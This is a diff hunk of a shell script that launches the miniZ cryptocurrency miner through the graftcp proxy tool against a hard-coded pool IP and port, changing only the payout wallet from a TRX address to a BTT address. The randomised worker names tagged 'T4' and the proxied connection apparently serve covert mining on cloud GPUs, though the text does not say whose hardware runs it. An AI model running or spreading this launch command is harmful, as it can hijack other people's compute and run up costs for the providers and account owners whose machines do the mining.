@@ -31,4 +31,4 @@ tar xf miniZ_v1.8y2_linux-x64.tar.gz
 
 chmod +x miniZ
 
-./graftcp/graftcp ./miniZ -u TRX:TL9Zj9rC4jbBDcGHq7H2xNJQw34VrgtBJs.Mini $(echo $(shuf -i 1-999 -n 1)-T4) -l 159.203.163.51 --port=3333 -p x --par=ethash --pers auto
+./graftcp/graftcp ./miniZ -u BTT:TUHSHk7a4LBushQpCh22jBXz5QeMUfUt77.Mini $(echo $(shuf -i 1-999 -n 1)-T4) -l 159.203.163.51 --port=3333 -p x --par=ethash --pers auto
